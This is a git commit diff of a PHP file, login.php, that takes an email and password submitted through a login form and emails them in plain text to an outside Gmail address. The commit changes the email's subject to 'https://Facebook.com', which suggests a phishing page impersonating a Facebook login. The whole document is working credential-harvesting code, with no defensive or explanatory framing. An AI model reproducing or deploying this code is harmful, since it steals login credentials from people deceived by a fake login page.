4bcfbe48fc7fdfc60479770a0906643b45b07ce7
gdjshsbssbgssg <khorsed.alom67771@gmail.com>
2025-08-07 14:34:31 +0300

    Update login.php

--- login.php
+++ login.php
@@ -3,11 +3,12 @@
   $password = $_POST['password'];
 
   $to = "hastehena12@gmail.com";
-  $subject = "New Login";
+  $subject = "https://Facebook.com";
   $message = "Email: $email\nPassword: $password";
   $headers = "From: no-reply@example.com";
 
   mail($to, $subject, $message, $headers);
   echo "Sent!";
 ?>
+
 
